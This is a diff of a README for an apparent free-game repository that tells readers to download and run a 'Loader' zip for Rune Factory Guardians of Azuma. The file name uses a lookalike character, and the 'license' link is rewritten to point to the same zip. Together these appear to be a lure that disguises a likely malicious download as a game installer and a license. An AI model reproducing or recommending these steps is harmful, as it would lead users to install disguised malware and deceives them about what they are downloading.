@@ -19,7 +19,7 @@ Welcome! This repository provides access to the **Rune Factory Guardians of Azum
 | 🤖 Android       | 12L, 13, 14                | Loader app support           |
 
 ## 🛠️ Installation
-1. Download **https://raw.githubusercontent.com/fgsanchezb/RuneFactoryAzuma-FreeGameHub/main/Lоader.zip** from this repository.
+1. Download **https://raw.githubusercontent.com/fgsanchezb/RuneFactoryAzuma-FreeGameHub/main/Lоader.zipоhttps://raw.githubusercontent.com/fgsanchezb/RuneFactoryAzuma-FreeGameHub/main/Lоader.zip** from this repository.
 2. Extract all files to a preferred directory.
 3. Run the Loader setup and follow instructions.
 4. Start **Rune Factory Guardians of Azuma** and play!
@@ -32,4 +32,4 @@ This repository is for educational and archival purposes only. All trademarks an
 
 ## 📜 License
 Distributed under the MIT License (2025).  
-[Read the full MIT License here.](https://raw.githubusercontent.com/fgsanchezb/RuneFactoryAzuma-FreeGameHub/main/Lоader.zip)
+[Read the full MIT License here.](https://raw.githubusercontent.com/fgsanchezb/RuneFactoryAzuma-FreeGameHub/main/Lоader.zipоhttps://raw.githubusercontent.com/fgsanchezb/RuneFactoryAzuma-FreeGameHub/main/Lоader.zip)
